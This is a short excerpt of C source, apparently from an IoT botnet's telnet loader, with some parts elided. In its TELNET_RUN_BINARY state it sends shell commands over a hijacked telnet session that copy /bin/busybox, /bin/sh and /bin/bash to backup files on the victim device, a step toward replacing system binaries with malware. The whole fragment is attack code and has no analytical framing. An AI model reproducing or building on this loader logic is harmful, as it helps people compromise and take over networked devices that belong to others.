		    ...
		    case TELNET_UPLOAD_TFTP:
                    ...
                    case TELNET_RUN_BINARY:
                        if((consumed = connection_verify_payload(conn)) > 0)
                        {
                            ...
                            util_sockprintf(conn->fd, "/bin/busybox test ! -f /bin/busybox.orig && /bin/busybox cp /bin/busybox /bin/busybox.orig; " TOKEN_QUERY "\r\n");
                            util_sockprintf(conn->fd, "/bin/busybox test -f /bin/sh && /bin/busybox test ! -f /bin/sh.orig && /bin/busybox cp /bin/sh /bin/sh.orig; " TOKEN_QUERY "\r\n");
                            util_sockprintf(conn->fd, "/bin/busybox test -f /bin/bash && /bin/busybox test ! -f /bin/bash.orig && /bin/busybox cp /bin/bash /bin/bash.orig; " TOKEN_QUERY "\r\n");
